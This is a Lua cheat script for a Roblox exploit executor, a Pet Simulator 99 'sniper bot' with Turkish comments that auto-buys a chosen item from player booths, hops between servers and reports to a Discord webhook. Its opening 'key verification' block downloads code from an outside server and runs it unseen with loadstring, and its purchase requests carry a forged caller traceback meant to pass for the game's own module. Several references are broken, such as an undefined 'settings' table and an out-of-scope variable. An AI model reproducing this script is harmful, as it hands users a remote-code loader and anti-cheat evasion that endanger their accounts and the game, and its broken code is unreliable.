-- DOĞRULAMA SİSTEMİ
local requestFunc = syn and syn.request or http and http.request or http_request or request

if not requestFunc then
    warn("Bu executor HTTP isteğini desteklemiyor.")
    return
end

local G_Key = G_Key or _G.G_Key or "c4df70b7-a392-42bc-8c5d-fa5ac61b69b9"

local G_Settings = G_Settings or _G.G_Settings or {
    targetItemName = "Titanic Storm Axolotl Ball",
    itemType = "Pet",
    maxCost = "4b",
    delayBetweenPurchases = 4,
    scanDelay = 0.2,
    webhookEnabled = true,
    webhookURL = "https://discord.com/api/webhooks/...",
    webhookUsername = "PS99 Sniper Bot",
    webhookAvatar = "https://i.imgur.com/JY8jAnp.png",
    serverHopDelay = 3,
    largeStockThreshold = 10000
}

-- KEY DOĞRULAMA
local url = "https://rlwscripts.onrender.com/execute?key=" .. _G.G_Key

local response = requestFunc({
    Url = url,
    Method = "GET"
})

if response and response.StatusCode == 200 then
    local scriptContent = response.Body
    if scriptContent and scriptContent ~= "" then
        local success, err = pcall(function()
            loadstring(scriptContent)()
        end)
        if not success then
            warn("Script çalıştırılamadı:", err)
        end
    else
        warn("Boş içerik geldi.")
    end
else
    warn("Key Hatalı veya sunucuya bağlanılamadı.")
    return
end

--[[
  PS99 AKILLI SNIPER BOT - TÜM ITEM TÜRLERİ DESTEĞİ
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Network = ReplicatedStorage:WaitForChild("Network")
local Booths = game:GetService("Workspace").__THINGS.Booths
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- OYUN İÇİ KATEGORİ DÖNÜŞÜMLERİ
local GAME_CATEGORY_MAP = {
    Pet = "Pet",
    Lootbox = "Lootbox",
    Hoverboard = "Hoverboard",
    Egg = "Egg",
    Charm = "Charm",
    Potion = "Potion",
    Enchant = "Enchant",
    Misc = "MiscItems",
    Ultimate = "Ultimate"
}

-- API KOLEKSİYON DÖNÜŞÜMLERİ
local API_COLLECTION_MAP = {
    Pet = "Pets",
    Lootbox = "Lootboxes",
    Hoverboard = "Hoverboards",
    Egg = "Eggs",
    Charm = "Charms",
    Potion = "Potions",
    Enchant = "Enchants",
    Misc = "MiscItems",
    Ultimate = "Ultimates"
}

-- FİYAT PARSE FONKSİYONU
local function parsePrice(priceText)
    local cleanText = priceText:gsub("[ ,%$]", ""):lower()
    
    -- Bilimsel gösterim kontrolü
    if cleanText:find("e") then
        local base, exponent = cleanText:match("([%d%.]+)e([%d%.]+)")
        if base and exponent then
            return (tonumber(base) or 0) * 10^(tonumber(exponent) or 0)
        end
    end
    
    -- Suffix kontrolü (b, m, k)
    local number, suffix = cleanText:match("([%d%.]+)([mkb]?)")
    number = tonumber(number) or 0
    
    local multipliers = {
        b = 1000000000, -- milyar
        m = 1000000,    -- milyon
        k = 1000        -- bin
    }
    
    if suffix and multipliers[suffix] then
        return number * multipliers[suffix]
    end
    
    return number
end

-- BÜTÇE PARSE FONKSİYONU
local function parseBudget(input)
    if type(input) == "number" then return input end
    if type(input) ~= "string" then return 0 end
    
    input = input:lower():gsub("[ ,]", "")
    local num = tonumber(input:match("[%d%.]+") or 0)
    local suffix = input:match("[kmb]") or ""

    local multipliers = {
        k = 1000,
        m = 1000000,
        b = 1000000000
    }
    
    return num * (multipliers[suffix] or 1)
end

-- FORMATLAMA FONKSİYONU
local function formatNumber(num)
    if not num or type(num) ~= "number" or num < 0 then return "0" end
    
    if num >= 1000000000 then
        local value = num / 1000000000
        if value == math.floor(value) then
            return string.format("%.0fB", value)
        else
            return string.format("%.1fB", value)
        end
    elseif num >= 1000000 then
        local value = num / 1000000
        if value == math.floor(value) then
            return string.format("%.0fM", value)
        else
            return string.format("%.1fM", value)
        end
    elseif num >= 1000 then
        return string.format("%.1fK", num/1000)
    end
    return tostring(math.floor(num))
end

-- ITEM VERİLERİNİ ÇEKME
local function getItemData()
    local collection = API_COLLECTION_MAP[_G.G_Settings.itemType] or API_COLLECTION_MAP.Pets
    local url = "https://biggamesapi.io/api/collection/"..collection
    
    local response = (syn and syn.request or request or http_request)({
        Url = url,
        Method = "GET"
    })
    
    if response and response.Success then
        local data = HttpService:JSONDecode(response.Body).data
        for _, item in ipairs(data) do
            if item.configName == _G.G_Settings.targetItemName then
                _G.G_Settings.targetImageId = item.configData and item.configData.thumbnail
                if _G.G_Settings.targetImageId then
                    print(string.format("✅ %s bulundu: %s", _G.G_Settings.itemType, _G.G_Settings.targetItemName))
                    return true
                end
            end
        end
    end
    
    warn(string.format("❌ %s verileri çekilemedi: %s", _G.G_Settings.targetItemName, response and response.StatusCode or "Bağlantı hatası"))
    return false
end

-- CALLER YAPISI 
local function getFakeCaller()
    return {
        ["LineNumber"] = 527,
        ["ScriptClass"] = "ModuleScript",
        ["Variadic"] = false,
        ["Traceback"] = "ReplicatedStorage.Library.Client.BoothCmds:527 function PromptPurchase2\nReplicatedStorage.Library.Client.BoothCmds:654 function promptOtherPlayerBooth2\nReplicatedStorage.Library.Client.BoothCmds:157",
        ["ScriptPath"] = "ReplicatedStorage.Library.Client.BoothCmds",
        ["FunctionName"] = "PromptPurchase2",
        ["Handle"] = "function: 0xe90b5a337ba195fb",
        ["ScriptType"] = "Instance",
        ["ParameterCount"] = 2,
        ["SourceIdentifier"] = "ReplicatedStorage.Library.Client.BoothCmds"
    }
end

-- MİKTAR ÇEKME 
local function getActualQuantity(itemSlot)
    if not itemSlot then return 1 end
    
    local quantityLabels = {"Quantity", "Amount", "Qty", "Count"}
    for _, labelName in ipairs(quantityLabels) do
        local label = itemSlot:FindFirstChild(labelName)
        if label and label:IsA("TextLabel") then
            local text = label.Text:gsub("[^%d%.kKmM]", ""):lower()
            local num = tonumber(text:gsub("[km]", "")) or 0
            if text:find("k") then num = num * 1000
            elseif text:find("m") then num = num * 1000000 end
            return math.max(1, math.floor(num))
        end
    end
    
    if itemSlot:FindFirstChild("PetTag") then return 1 end
    
    for _, child in ipairs(itemSlot:GetChildren()) do
        if child:IsA("TextLabel") then
            local text = child.Text:gsub("[^%d%.kKmM]", ""):lower()
            if #text > 0 then
                local num = tonumber(text:gsub("[km]", "")) or 0
                if text:find("k") then num = num * 1000
                elseif text:find("m") then num = num * 1000000 end
                return math.max(1, math.floor(num))
            end
        end
    end
    
    return 1
end

-- WEBHOOK 
local function sendWebhook(data)
    if not _G.G_Settings.webhookEnabled then return end
    
    local color = data.price < 10000 and 65280 or data.price < 50000 and 16776960 or 16711680
    
    local embed = {
        {
            title = "✅ BAŞARILI ALIM ✅",
            description = string.format(
                "*Item Adı:* %s\n*Tür:* %s\n*Satıcı:* %s\n*Fiyat:* %s\n*Adet:* %s\n*Toplam:* %s",
                _G.G_Settings.targetItemName,
                _G.G_Settings.itemType,
                data.userId,
                formatNumber(data.price),
                formatNumber(data.quantity),
                formatNumber(data.totalCost)
            ),
            color = color,
            thumbnail = {
                url = "rbxassetid://"..(_G.G_Settings.targetImageId and _G.G_Settings.targetImageId:match("%d+") or "")
            },
            fields = {
                {
                    name = "Sunucu Bilgisi",
                    value = string.format("Job ID: %s", game.JobId),
                    inline = true
                },
                {
                    name = "Zaman",
                    value = os.date("%d/%m/%Y %H:%M:%S"),
                    inline = true
                }
            },
            footer = {
                text = "PS99 Sniper Bot",
                icon_url = _G.G_Settings.webhookAvatar
            }
        }
    }
    
    local payload = {
        username = _G.G_Settings.webhookUsername,
        avatar_url = _G.G_Settings.webhookAvatar,
        embeds = embed,
        content = "@here Yeni item alındı!"
    }

    (syn and syn.request or http and http.request or request)({
        Url = _G.G_Settings.webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- GELİŞMİŞ SATIN ALMA FONKSİYONU (ÇALIŞAN TOPLU ALIM SİSTEMİ)
local function purchaseItem(userId, itemId, sellerName, price, quantity)
    -- 1. BAKİYE VE STOK KONTROLLERİ
    local playerDiamonds = Players.LocalPlayer.leaderstats["💎 Diamonds"].Value
    local maxAffordable = math.floor(playerDiamonds / price)
    
    if maxAffordable <= 0 then
        print(string.format("⛔ BAKİYE YETERSİZ | 1 adet için bile yeterli değil | Gereken: %s | Var: %s", 
            formatNumber(price), formatNumber(playerDiamonds)))
        return false
    end

    -- 2. GERÇEK STOK MİKTARINI AL
    local realStock = quantity
    local stockCheckSuccess, stockData = pcall(function()
        return ReplicatedStorage.Network.GetBoothStock:InvokeServer(userId)
    end)
    
    if stockCheckSuccess and stockData and stockData[itemId] then
        realStock = stockData[itemId]
        print(string.format("ℹ️ STOK BİLGİSİ | Görünen: %s | Gerçek: %s", 
            formatNumber(quantity), formatNumber(realStock)))
    else
        warn("⚠️ Stok bilgisi alınamadı, görünen stok kullanılıyor")
    end

    -- 3. ALIM STRATEJİSİ BELİRLEME
    local purchaseAmount = math.min(realStock, maxAffordable)
    
    if purchaseAmount <= 0 then
        print("⛔ Stokta item kalmadı veya bakiye yetersiz")
        return false
    end

    print(string.format("🔄 ALIM BAŞLATILIYOR | %s | Fiyat: %s | Stok: %s | Alınacak: %s", 
        itemId, formatNumber(price), formatNumber(realStock), formatNumber(purchaseAmount)))

    -- 4. AKILLI TOPLU ALIM SİSTEMİ
    local function attemptBulkPurchase(amount)
        local args = {
            [1] = userId,
            [2] = {[itemId] = amount},
            [3] = {["Caller"] = getFakeCaller()}
        }
        
        local success, result = pcall(function()
            return Network.Booths_RequestPurchase:InvokeServer(unpack(args))
        end)
        
        if success and result == true then
            return true
        else
            warn(string.format("❌ TOPLU ALIM HATASI (%s adet): %s", amount, tostring(result)))
            return false
        end
    end

    -- 5. KADEMELİ ALIM DENEMELERİ
    local purchased = 0
    local remaining = purchaseAmount
    
    -- Önce tamamını almayı dene
    if attemptBulkPurchase(remaining) then
        purchased = remaining
        print(string.format("🎉 TAM TOPLU ALIM | %s: %s adet | Toplam: %s", 
            itemId, formatNumber(purchased), formatNumber(price * purchased)))
    else
        -- Büyük gruplarla deneme (100, 50, 25, 10, 5, 1)
        local chunkSizes = {100, 50, 25, 10, 5, 1}
        
        for _, chunk in ipairs(chunkSizes) do
            while remaining >= chunk do
                if not settings.running then break end
                
                if attemptBulkPurchase(chunk) then
                    purchased = purchased + chunk
                    remaining = remaining - chunk
                    print(string.format("✅ GRUPLU ALIM | %s: %s adet | Kalan: %s", 
                        itemId, formatNumber(chunk), formatNumber(remaining)))
                    task.wait(0.15) -- Sunucu yükünü azalt
                else
                    break
                end
            end
            
            if remaining == 0 then break end
        end
    end

    -- 6. SONUÇ DEĞERLENDİRME
    if purchased > 0 then
        local totalCost = price * purchased
        print(string.format("🌟 ALIM TAMAMLANDI | Toplam: %s adet | Ödenen: %s", 
            formatNumber(purchased), formatNumber(totalCost)))
        
        sendWebhook({
            itemId = itemId,
            seller = sellerName,
            price = price,
            quantity = purchased,
            totalCost = totalCost,
            imageUrl = "rbxassetid://"..settings.targetImageId:match("%d+")
        })
        return true
    else
        warn("❌ HİÇBİR ALIM YAPILAMADI")
        return false
    end
end

-- TRADING TERMINAL SEARCH 
local function searchTargetItem()
    local remote = ReplicatedStorage.Network.TradingTerminal_Search
    local gameCategory = GAME_CATEGORY_MAP[_G.G_Settings.itemType] or "Pet"
    local searchQuery = '{"id":"'.._G.G_Settings.targetItemName..'"}'
    
    local success, result = pcall(function()
        return remote:InvokeServer(gameCategory, searchQuery, nil, false)
    end)
    
    if success and result then
        print(string.format("🌍 Terminal Arama sonucu: %s (PlaceID: %s)", 
            _G.G_Settings.targetItemName, result.place_id))
        return result
    else
        warn("❌ TradingTerminal_Search hatası:", tostring(result))
        return nil
    end
end

-- TELEPORT 
local function teleportToTargetItem(searchResult)
    if not searchResult then return false end
    
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(
            searchResult.place_id,
            searchResult.job_id,
            Players.LocalPlayer
        )
    end)
    
    if not success then
        warn("Teleport hatası:", err)
        return false
    end
    
    return true
end

-- SERVER HOP 
local function serverHopFallback()
    print("🔁 Normal server hop yapılıyor...")
    local oldJobId = game.JobId
    
    local servers = {}
    local success, response = pcall(function()
        return game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
    end)
    
    if success then
        local data = HttpService:JSONDecode(response)
        for _, server in ipairs(data.data) do
            if server.playing < 30 and server.id ~= oldJobId then
                table.insert(servers, server.id)
            end
        end
    end
    
    if #servers == 0 then
        success, response = pcall(function()
            return game:HttpGetAsync("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="..(data and data.nextPageCursor or ""))
        end)
        
        if success then
            data = HttpService:JSONDecode(response)
            for _, server in ipairs(data.data) do
                if server.playing < 30 and server.id ~= oldJobId then
                    table.insert(servers, server.id)
                end
            end
        end
    end
    
    if #servers > 0 then
        local target = servers[math.random(1, #servers)]
        TeleportService:TeleportToPlaceInstance(game.PlaceId, target)
    else
        TeleportService:Teleport(game.PlaceId)
    end
    
    local startTime = os.time()
    while os.time() - startTime < 10 do
        if game.JobId ~= oldJobId then
            print("✅ Sunucu başarıyla değiştirildi!")
            return true
        end
        wait(1)
    end
    
    print("❌ Sunucu değiştirilemedi, tekrar deneniyor...")
    return false
end

-- TARAMA FONKSİYONU 
local function checkItemInCurrentServer()
    print("🔍 Mevcut sunucuda manuel tarama yapılıyor...")

    local playersByDisplayName = {}
    for _, player in ipairs(Players:GetPlayers()) do
        playersByDisplayName[player.DisplayName] = player
        playersByDisplayName[player.Name] = player
    end

    for _, booth in ipairs(Booths:GetChildren()) do
        if not _G.G_Settings.running then break end

        local info = booth:FindFirstChild("Info")
        local itemsContainer = booth:FindFirstChild(_G.G_Settings.itemType.."s") or booth:FindFirstChild(_G.G_Settings.itemType)

        if info and itemsContainer then
            local boothBottom = info:FindFirstChild("BoothBottom")
            local frame = boothBottom and boothBottom:FindFirstChild("Frame")
            local usernameLabel = frame and frame:FindFirstChild("Top")

            if usernameLabel and usernameLabel:IsA("TextLabel") then
                local displayName = usernameLabel.Text:match("^(.-)'s Booth")

                if displayName and playersByDisplayName[displayName] then
                    local player = playersByDisplayName[displayName]

                    local boothTop = itemsContainer:FindFirstChild("BoothTop")
                    local itemScroll = boothTop and boothTop:FindFirstChild("PetScroll") or boothTop:FindFirstChild("ItemScroll")

                    if itemScroll then
                        for _, item in ipairs(itemScroll:GetChildren()) do
                            if not _G.G_Settings.running then break end

                            local holder = item:FindFirstChild("Holder")
                            local itemSlot = holder and holder:FindFirstChild("ItemSlot")
                            local icon = itemSlot and itemSlot:FindFirstChild("Icon")
                            local buyButton = item:FindFirstChild("Buy")
                            local costLabel = buyButton and buyButton:FindFirstChild("Cost")

                            if icon and costLabel and (not _G.G_Settings.targetImageId or icon.Image == _G.G_Settings.targetImageId) then
                                local success, cost = pcall(parsePrice, costLabel.Text)
                                if not success or not cost then
                                    warn("❌ Fiyat parse edilemedi:", costLabel and costLabel.Text or "nil")
                                    break
                                end

                                local quantity = 1
                                if itemSlot then
                                    pcall(function()
                                        quantity = getActualQuantity(itemSlot)
                                    end)
                                end

                                if cost > 0 then
                                    print(string.format("✅ HEDEF ITEM BULUNDU! | %s | Fiyat: %s | Stok: %s | Satıcı: %s",
                                        _G.G_Settings.targetItemName,
                                        formatNumber(cost),
                                        formatNumber(quantity),
                                        player.UserId))

                                    if not player.UserId or not item.Name then
                                        warn("❌ Geçersiz satıcı veya item bilgisi")
                                        break
                                    end

                                    if cost <= parseBudget(_G.G_Settings.maxCost) then
                                        local args = {
                                            player.UserId,
                                            tostring(item.Name),
                                            cost,
                                            quantity
                                        }

                                        local purchaseSuccess = purchaseItem(unpack(args))
                                        if purchaseSuccess then
                                            return true
                                        end
                                    else
                                        print(string.format("ℹ️ Fiyat çok yüksek | %s > %s",
                                            formatNumber(cost),
                                            formatNumber(parseBudget(_G.G_Settings.maxCost))))
                                        return false
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    print("❌ Mevcut sunucuda hedef item bulunamadı")
    return false
end

-- ANA DÖNGÜ 
_G.G_Settings.maxCost = parseBudget(_G.G_Settings.maxCost) -- Bütçeyi parse et

if getItemData() then
    while _G.G_Settings.running do
        local itemFoundInCurrent = checkItemInCurrentServer()
        
        if itemFoundInCurrent then
            wait(_G.G_Settings.delayBetweenPurchases)
        else
            local searchResult = searchTargetItem()
            
            if searchResult then
                if teleportToTargetItem(searchResult) then
                    wait(5)
                else
                    serverHopFallback()
                end
            else
                serverHopFallback()
            end
            
            wait(_G.G_Settings.serverHopDelay)
        end
    end
else
    warn("❌ Script başlatılamadı: Item verileri yüklenemedi!")
end

print("⏹ Bot durduruldu")
